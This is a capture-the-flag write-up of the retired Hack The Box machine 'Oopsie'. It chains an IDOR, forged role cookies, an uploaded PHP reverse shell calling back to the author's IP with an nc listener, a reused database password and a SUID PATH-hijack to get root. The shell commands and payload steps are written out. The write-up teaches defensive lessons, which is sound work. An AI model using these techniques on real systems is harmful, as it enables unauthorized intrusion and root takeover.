---
layout: post
title: "HTB Oopsie"
date: 2026-07-14
category: "HTB Writeups"
difficulty: "Very Easy"
tags: [linux, web, idor, cookies, file-upload, suid, path-hijack, starting-point]
excerpt: "A guest login leaks an admin access ID, two tampered cookies unlock a file upload, and a PHP shell gets me in. Then a SUID binary that calls cat without a path hands over root."
---

Oopsie is the box where the whole thing is a chain of small trust mistakes, each
one boring on its own. A login page that hands out guest access, an account page
you can walk by ID, a cookie the server believes without checking, an upload
gated only by that cookie, and finally a root binary that trusts your `PATH`.
None of these is a dramatic exploit. Stacked together they take you from an
anonymous browser tab to a root shell.

## Recon

```bash
sudo nmap -sC -sV 10.129.95.191
```

| Port | Service | Version                        |
| ---- | ------- | ------------------------------ |
| 22   | SSH     | OpenSSH 7.6p1 (Ubuntu)         |
| 80   | HTTP    | Apache httpd 2.4.29 (Ubuntu)   |

SSH won't move without creds, so port 80 is the game. The site is a corporate
brochure page for "MegaCorp Automotive". Nothing obviously interactive on the
surface, which on a box like this means the interesting part is hidden a layer
down.

## Enumeration

Directory busting first:

```bash
gobuster dir -u http://10.129.95.191 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html
# /css /fonts /images /js /themes
# /uploads   (301)
# index.php  (200)
```

An `/uploads` directory is a loud hint that this box wants me to put a file
somewhere. But the front page has no upload form, so there's an area I haven't
found yet. The answer was in the JavaScript, not the HTML. Reading the site's
JS files turned up a reference to a login endpoint the navigation never links to:

```
http://10.129.95.191/cdn-cgi/login/
```

That page has a normal username/password box and, underneath it, a **Login as
Guest** button. Free access, no creds needed.

## The IDOR and the cookie

As guest I get a small account panel. The Account page URL carries my identity in
the query string:

```
/cdn-cgi/login/admin.php?content=accounts&id=2
```

Guest is `id=2`. The obvious move is to walk that number. Setting `id=1` shows a
different account, and crucially the page prints each account's **Access ID**
alongside it. The super-admin's Access ID is **34322**.

> This is the actual bug. The page lets any logged-in user read any other
> account by ID (a textbook IDOR), and it leaks a value the app treats as a
> secret. One authorized-but-nosy user reading `id=1` gets everything they need
> to impersonate the admin.

Now the upload. Browsing to the uploads area as guest gets refused with a
"super admin" message. The site decides who you are with two cookies:

```
role=guest;  user=<my access id>
```

The server never revalidates these against a session, it just trusts them. So I
rewrote both in the browser dev tools:

```
role=admin;  user=34322
```

Reload, and the uploads page renders for me as super admin.

## Foothold

With the upload unlocked I grabbed pentestmonkey's PHP reverse shell, set the
callback to my `tun0` address and a port I had a listener on, and uploaded it.

```php
// php-reverse-shell.php
$ip = '10.10.14.128';   // my tun0
$port = 4444;
```

Uploaded files land in `/uploads`, and Apache runs PHP there, so requesting the
file executes it. Listener up first:

```bash
rlwrap nc -lvnp 4444
```

Then trigger it:

```bash
curl http://10.129.95.191/uploads/php-reverse-shell.php
```

Shell back as `www-data`. First thing, upgrade the dumb shell to something that
behaves like a terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## From www-data to robert

The web root is where the login page keeps its database config, and that's the
first place to look:

```bash
cat /var/www/html/cdn-cgi/login/db.php
# 'robert' / 'M3g4C0rpUs3r!'
```

There's a local user `robert` on the box, and the classic mistake is password
reuse between the app's DB account and the system account. It reuses:

```bash
su robert
# Password: M3g4C0rpUs3r!
cat /home/robert/user.txt
```

First flag. `su` matters here rather than trying to shove the password into a web
form, because I want a real user session for the next step.

## Privilege Escalation

`robert`'s groups are the tell:

```bash
id
# uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

That `bugtracker` group isn't standard, so something on disk must be owned by it:

```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker

ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
```

A SUID binary, owned by root, that the `bugtracker` group is allowed to run. It
runs as root no matter who launches it. Running it, it asks for a bug ID and
prints a report file. Pulling strings out of the binary shows how it reads that
file:

```bash
strings /usr/bin/bugtracker
# ...
# cat /root/reports/
# ...
```

It calls `cat` with no absolute path. When a program does that, the shell finds
`cat` by searching `PATH` in order, and I control `PATH`. So I put my own `cat`
first, one that gives me a shell instead of reading a file:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH

bugtracker
# enter any bug id, then hit enter
```

Because `bugtracker` is SUID root and it resolves `cat` to my `/tmp/cat`, the
`/bin/bash` it launches runs as root.

```bash
# whoami -> root
cat /root/root.txt
```

Rooted.

## Takeaways

- The web half is four failures in a row: a hidden-but-unauthenticated login, an
  IDOR that leaks the admin's ID, an upload that trusts client-side cookies for
  authorization, and a directory that executes what you upload. Each is common.
  Chaining them is the lesson.
- Never trust a cookie to carry authorization. `role=admin` is only as strong as
  the server's willingness to re-check it, and here it did zero checking. Session
  state belongs on the server.
- Read the JavaScript. The whole box hinges on a login endpoint that nothing
  links to but the JS mentions. Directory busting alone would have missed it.
- `db.php` and config files in the web root are always worth a look, and reused
  passwords turn one leak into a full user account.
- The privesc is the SUID + relative-path pattern worth memorising: if a root
  binary calls a command without an absolute path, you own that command via
  `PATH`. The fix is trivial (call `/bin/cat`, or drop SUID), which is exactly
  why it's everywhere.

> Retired Starting Point box on my own Hack The Box account. Only ever test what
> you're allowed to.
